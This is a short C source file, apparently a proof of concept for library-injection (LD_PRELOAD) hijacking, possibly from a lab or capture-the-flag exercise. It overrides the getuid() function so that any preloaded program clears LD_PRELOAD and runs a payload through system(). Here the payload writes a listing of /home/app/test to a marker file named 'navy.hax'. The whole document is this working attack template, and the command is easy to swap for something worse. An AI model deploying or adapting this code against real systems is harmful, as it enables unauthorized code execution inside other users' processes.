#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void payload()
{
    system("ls /home/app/test > /home/app/test/navy.hax");
}
int getuid()
    {
        if(getenv("LD_PRELOAD")==NULL)
        {
            return 0;
        }
        unsetenv("LD_PRELOAD");
        payload();
    }